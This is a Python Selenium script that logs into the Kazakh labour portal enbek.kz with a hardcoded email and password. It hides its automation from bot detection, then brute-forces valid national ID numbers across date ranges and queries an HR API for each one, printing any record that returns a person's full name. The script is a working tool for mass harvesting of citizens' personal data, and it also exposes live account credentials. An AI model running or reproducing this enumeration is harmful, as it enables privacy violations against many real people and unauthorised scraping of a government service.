from types import NoneType
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import time
from fn import getGenderNum, NoneCat, fillChar, write_to_file_safely
    
options = Options()
options.add_argument("user-agent=" + UserAgent().random)
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
options.add_argument("--disable-blink-features=AutomationControlled")

browser = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
browser.maximize_window()
browser.get("https://passport.enbek.kz/ru/user/login")
email = browser.find_element(By.NAME, "email")
email.send_keys("b.iliyas.2005@gmail.com")

password = browser.find_element(By.NAME, "password")
password.send_keys("Iliyas2005@")
continue_button = browser.find_element(By.XPATH, value="//button[@type='submit']")
continue_button.click()
print("Start : ")
yStart = int(input("    Year - "))
mStart = int(input("    Month - "))
dStart = int(input("    Day - "))
print("End : ")
yEnd = int(input("  Year - "))
mEnd = int(input("  Month - "))
dEnd = int(input("  Day - "))
print()
gender = input("Gender male[m] famale[f] : ")
browser.get("https://hr.enbek.kz")
for year in range(yStart, yEnd):
    for month in range(mStart, mEnd):
        for day in range(dStart,dEnd):
            iin = str(year).replace(str(year)[0] + str(year)[1],"") + fillChar(month, 2, '0', False) + fillChar(day, 2, '0', False) + getGenderNum(str(year), gender)
            indexStart = int(input("Start index : "))
            indexEnd = int(input("End index : "))
            for i in range(indexStart,indexEnd):
                iinCopy = iin
                iinCopy = iinCopy + fillChar(i, 4, '0', False)
                v = []
                for j in range(0, len(iinCopy)):
                    v.append(int(iinCopy[j]))
                is_actual = False
                n12 = (1*v[0] + 2*v[1] + 3*v[2] + 4*v[3] + 5*v[4] + 6*v[5] + 7*v[6] + 8*v[7] + 9*v[8] + 10*v[9] + 11*v[10]) % 11
                    
                if n12 == 10:
                    n12 = (3*v[0] + 4*v[1] + 5*v[2] + 6*v[3] + 7*v[4] + 8*v[5] + 9*v[6] + 10*v[7] + 11*v[8] + 1*v[9] + 2*v[10]) % 11
                    if n12 != 10:
                        is_actual = True
                else:
                    is_actual = True
                if(is_actual):
                    v.append(n12)
                    iinCopy = ''.join(str(i) for i in v)
                    script= """
                        //console.log(\"{iinCopy}\");
                        var xhr = new XMLHttpRequest();
                        xhr.onreadystatechange = function() {
                            if (xhr.readyState == 4 && xhr.status == 200) {
                                responseData = xhr.responseText;
                                jsonObj = JSON.parse(responseData);
                                if(jsonObj["fullNamePerson"] !== null)
                                    console.log(responseData);
                            }
                        };

                        xhr.open("GET", "https://hr.enbek.kz/api/contract/universalMethods/requestFlData?iin="+\"{iinCopy}\", true);
                        xhr.send();
                    """
                    browser.execute_script(script.replace("{iinCopy}", iinCopy)) 

time.sleep(100000)          


